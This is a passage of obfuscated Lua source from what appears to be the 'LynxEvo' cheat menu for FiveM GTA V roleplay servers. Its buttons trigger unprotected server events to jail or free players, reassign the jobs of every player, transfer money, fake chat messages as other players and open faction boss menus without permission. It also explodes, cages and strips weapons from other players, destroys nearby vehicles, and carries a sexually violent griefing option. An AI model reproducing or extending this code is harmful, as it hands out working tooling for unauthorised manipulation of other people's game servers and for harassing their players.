    then drawNotification("~h~~r~Operation cancelled~s~.")
    else drawNotification("~h~~r~Invalid Confirmation~s~.") drawNotification("~h~~r~Operation cancelled~s~.") end elseif LynxEvo.CheckBox("~h~Freeze Player", freezeplayer, function(dL) freezeplayer = dL end) then elseif LynxEvo.MenuButton("~h~~p~#~s~ Give Single Weapon", "GiveSingleWeaponPlayer") then elseif LynxEvo.Button("~h~Give ~r~All Weapons") then
    for i = 1, #aZ do GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(aZ[i]), 1000, false, false) end elseif LynxEvo.Button("~h~Remove ~r~All Weapons") then RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true) elseif LynxEvo.Button("~h~Give ~r~Vehicle") then local ped = GetPlayerPed(SelectedPlayer) local c8 = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if c8
    and IsModelValid(c8) and IsModelAVehicle(c8) then RequestModel(c8) while not HasModelLoaded(c8) do Citizen.Wait(0) end;
    local veh = CreateVehicle(GetHashKey(c8), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
    else drawNotification("~r~Model is not valid!") end elseif LynxEvo.Button("~h~Send To ~r~Jail") then TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed") elseif LynxEvo.Button("~h~~g~Evade ~s~From Jail") then local dM = SelectedPlayer; TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(dM), 0, "escaperino") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(dM), 0) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(dM), 0) TriggerServerEvent("js:jailuser", GetPlayerServerId(dM), 0, "escaperino") end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXTriggerini") then
    if LynxEvo.Button("~p~TEST ~h~~g~Revive Player") then revivep() elseif LynxEvo.Button("~h~~g~Give money to player from your wallet") then local e = KeyboardInput("Enter amount of money to give", "", 100) if e ~= ""
    then TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(SelectedPlayer), "item_money", "money", e) end elseif LynxEvo.Button("~h~~b~Handcuff Player") then TriggerEvent("esx_policejob:handcuff", GetPlayerServerId(SelectedPlayer)) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("VRPPlayerTriggers") then
    if LynxEvo.Button("~h~Transfer money from your bank") then local dN = KeyboardInput("Enter amount of money to give", "", 100) local dO = KeyboardInput("Enter VRP PERMA ID!", "", 100) if dN ~= ""
    then local df = GetPlayerServerId(PlayerId()) TriggerEvent("bank:transfer", df, GetPlayerServerId(SelectedPlayer), dN) TriggerServerEvent("bank:transfer", dO, dN) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXJobs2") then
    if LynxEvo.Button("~h~Set Unemployed") then TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(SelectedPlayer)) UnemployedPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~b~Police ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "police", 3) PolicePlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~o~Mecano ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "mecano", 3) MecanoPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~y~Taxi ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "taxi", 3) TaxiPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~r~Ambulance ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "ambulance", 3) AmbulancePlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~g~Real Estate ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "realestateagent", 3) RealEstateAgentPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~r~Car ~b~Dealer ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "cardealer", 3) CarDealerPlayer(SelectedPlayer) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("Trollmenu") then
    if LynxEvo.MenuButton("~h~~p~#~s~ Spawn Peds", "SpawnPeds") then elseif LynxEvo.Button("~h~~r~Fake ~s~Chat Message") then local dP = KeyboardInput("Enter message to send", "", 100) local dQ = GetPlayerName(SelectedPlayer) if dP then TriggerServerEvent("_chat:messageEntered", dQ, {
        0, 0x99, 255
    }, dP) end elseif LynxEvo.Button("~h~~r~Kick ~s~From Vehicle") then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer)) elseif LynxEvo.Button("~h~~y~Explode ~s~Vehicle") then
    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
    else drawNotification("~h~~r~Player not in a vehicle~s~.") end elseif LynxEvo.Button("~h~~r~Banana ~p~Party") then bananaparty() elseif LynxEvo.Button("~h~~r~Explode") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true) elseif LynxEvo.Button("~h~~r~Rape") then rapeplayer() elseif LynxEvo.Button("~h~~r~Cage ~s~Player") then cageplayer() elseif LynxEvo.Button("~h~~r~Cage ~s~Player ~s~n ~y~Fire") then cageplayerfire() end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SpawnPeds") then
    if LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then bH("s_m_y_swat_01", "WEAPON_ASSAULTRIFLE") elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then bH("s_m_y_swat_01", "weapon_rpg") elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then bH("s_m_y_swat_01", "weapon_flaregun") elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then bH("s_m_y_swat_01", "weapon_railgun") end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 121) then
    if mhaonn then LynxEvo.OpenMenu("LynxX")
    else bt() end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("TeleportMenu") then
    if LynxEvo.Button("~h~Teleport to ~g~waypoint") then c3() elseif LynxEvo.Button("~h~Teleport into ~g~nearest ~s~vehicle") then bX() elseif LynxEvo.Button("~h~Teleport to ~r~coords") then bQ() elseif LynxEvo.Button("~h~Draw custom ~r~blip ~s~on map") then bU() elseif LynxEvo.CheckBox("~h~Show ~g~Coords", showCoords, function(dL) showCoords = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponMenu") then
    if LynxEvo.MenuButton("~h~~p~#~s~ Give Single Weapon", "WeaponTypes") then elseif LynxEvo.Button("~h~~g~Give All Weapons") then
    for i = 1, #aZ do GiveWeaponToPed(PlayerPedId(-1), GetHashKey(aZ[i]), 1000, false, false) end elseif LynxEvo.Button("~h~~r~Remove All Weapons") then RemoveAllPedWeapons(PlayerPedId(-1), true) elseif LynxEvo.Button("~h~Drop your current Weapon") then local af = GetPlayerPed(-1) local b = GetSelectedPedWeapon(af) SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1) elseif LynxEvo.Button("~h~~g~Give All Weapons to ~s~everyone") then
    for
    dR = 0, 128 do
        if dR ~=
    PlayerId(-1) and GetPlayerServerId(dR)  ~= 0 then
    for i = 1, #aZ do GiveWeaponToPed(PlayerPedId(dR), GetHashKey(aZ[i]), 1000, false, false) end end end elseif LynxEvo.Button("~h~~r~Remove All Weapons from ~s~everyone") then
    for
    dR = 0, 128 do
        if dR ~=
    PlayerId(-1) and GetPlayerServerId(dR)  ~= 0 then RemoveAllPedWeapons(PlayerPedId(dR), true) end end elseif LynxEvo.Button("~h~Give Ammo") then
    for i = 1, #aZ do AddAmmoToPed(PlayerPedId(-1), GetHashKey(aZ[i]), 200) end elseif LynxEvo.CheckBox("~h~~r~OneShot Kill", oneshot, function(dL) oneshot = dL end) then elseif LynxEvo.CheckBox("~h~Vehicle Gun", VehicleGun, function(dL) VehicleGun = dL end) then elseif LynxEvo.CheckBox("~h~Delete Gun", DeleteGun, function(dL) DeleteGun = dL end) then end;
    LynxEvo.Display() elseif LynxEvo.IsMenuOpened("tunings") then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, dA in pairs(bd) do
        if dA.
    id == "extra"
    and# checkValidVehicleExtras()  ~= 0 then
    if LynxEvo.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
    then
    if LynxEvo.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
    then
    if LynxEvo.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes"
    then
    if LynxEvo.MenuButton(dA.name, dA.id) then end
    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
        if LynxEvo.MenuButton(dA.name, dA.id) then end;
    break end end end;
    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
    else xenonStatus = "Not Installed"
    end;
    if LynxEvo.Button("Xenon Headlight", xenonStatus) then
    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("performance") then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, dA in pairs(be) do
        if LynxEvo.
    MenuButton(dA.name, dA.id) then end end;
    if IsToggleModOn(veh, 18) then turboStatus = "Installed"
    else turboStatus = "Not Installed"
    end;
    if LynxEvo.Button("~h~~b~Turbo ~h~Tune", turboStatus) then
    if not IsToggleModOn(veh, 18) then ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) end
    else ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("primary") then LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic1") LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic1") LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte1") LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal1") LynxEvo.Display() elseif LynxEvo.IsMenuOpened("secondary") then LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic2") LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic2") LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte2") LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal2") LynxEvo.Display() elseif LynxEvo.IsMenuOpened("rimpaint") then LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic3") LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic3") LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte3") LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal3") LynxEvo.Display() elseif LynxEvo.IsMenuOpened("classic1") then
    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and tp == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metallic1") then
    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and tp == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("matte1") then
    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and tp == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metal1") then
    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and tp == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("classic2") then
    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metallic2") then
    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("matte2") then
    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metal2") then
    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("classic3") then
    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metallic3") then
    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("matte3") then
    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metal3") then
    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
    dT.id and not b8 then pricetext = "Installed"
    else if b8 and ts == dT.id then pricetext = "Previewing"
    else pricetext = "Not Installed"
    end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(dT.name, pricetext) then
    if not b8 then ba = "paint"
    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("VehicleMenu") then
    if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~b~LSC ~s~Customs", "LSC") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle ~g~Boost", 'BoostMenu') then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle List", 'CarTypes') then elseif LynxEvo.MenuButton("~h~~p~#~s~ Global Car Trolls", 'GCT') then elseif LynxEvo.Button("~h~Spawn ~r~Custom ~s~Vehicle") then c7() elseif LynxEvo.Button("~h~~r~Delete ~s~Vehicle") then DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~~g~Repair ~s~Vehicle") then c9() elseif LynxEvo.Button("~h~~g~Repair ~s~Engine") then ca() elseif LynxEvo.Button("~h~~g~Flip ~s~Vehicle") then daojosdinpatpemata() elseif LynxEvo.Button("~h~~b~Max ~s~Tuning") then MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~~g~RC ~s~Car") then cb() LynxEvo.CloseMenu() elseif LynxEvo.CheckBox("~h~No Fall", Nofall, function(dL) Nofall = dL; SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall) end) then elseif LynxEvo.CheckBox("~h~Vehicle Godmode", VehGod, function(dL) VehGod = dL end) then elseif LynxEvo.CheckBox("~h~Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(dL) VehSpeed = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("GCT") then
    if LynxEvo.CheckBox("~h~~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(dL) destroyvehicles = dL end) then elseif LynxEvo.CheckBox("~h~~r~Delete~s~ Nearest Vehicles/Entity", deletenearestvehicle, function(dL) deletenearestvehicle = dL end) then elseif LynxEvo.CheckBox("~h~~r~Explode~s~ Nearest Vehicles", explodevehicles, function(dL) explodevehicles = dL end) then elseif LynxEvo.CheckBox("~h~~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(dL) fuckallcars = dL end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("LuaMenu") then
    if LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Boss", "ESXBoss") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Money", "ESXMoney") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Jobs", "ESXJobs") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Misc", "ESXCustom") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Drugs", "ESXDrugs") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~y~VRP ~s~Triggers", "VRPTriggers") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~b~Misc ~s~Triggers", "MiscTriggers") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXJobs") then
    if LynxEvo.Button("~h~Fire all players") then
    for af = 0, 128 do TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(af)) UnemployedPlayers() end elseif LynxEvo.Button("~h~Set all ~b~Police ~s~Job") then
    for
    af = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(af), "police", 3) PolicePlayers() end elseif LynxEvo.Button("~h~Set all ~o~Mecano ~s~Job") then
    for
    af = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(af), "mecano", 3) MecanoPlayers() end elseif LynxEvo.Button("~h~Set all ~y~Taxi ~s~Job") then
    for
    af = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(af), "taxi", 3) TaxiPlayers() end elseif LynxEvo.Button("~h~Set all ~r~Ambulance ~s~Job") then
    for
    af = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(af), "ambulance", 3) AmbulancePlayers() end elseif LynxEvo.Button("~h~Set all ~g~Real Estate ~s~Job") then
    for
    af = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(af), "realestateagent", 3) RealEstateAgentPlayers() end elseif LynxEvo.Button("~h~Set all ~r~Car ~b~Dealer ~s~Job") then
    for
    af = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(af), "cardealer", 3) CarDealerPlayers() end end;
    LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXBoss") then
    if LynxEvo.Button("~c~~h~Mechanic~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'mecano', function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "mecano", function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'mecano', function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "mecano", function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'mecano', function(dY, dZ) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "mecano", function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~b~~h~Police~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'police', function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "police", function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'police', function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "police", function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'police', function(dY, dZ) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "police", function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~r~~h~Ambulance~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'ambulance', function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "ambulance", function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'ambulance', function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "ambulance", function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'ambulance', function(dY, dZ) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "ambulance", function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~y~~h~Taxi~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'taxi', function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "taxi", function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'taxi', function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "taxi", function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'taxi', function(dY, dZ) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "taxi", function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~g~~h~Real Estate~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "realestateagent", function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "realestateagent", function(dW, dX) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(dY, dZ) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "realestateagent", function(dY, dZ) LynxEvo.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~o~~h~Car Dealer~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'cardealer', function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "cardealer", function(dU, dV) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'cardealer', function(dW, dX) 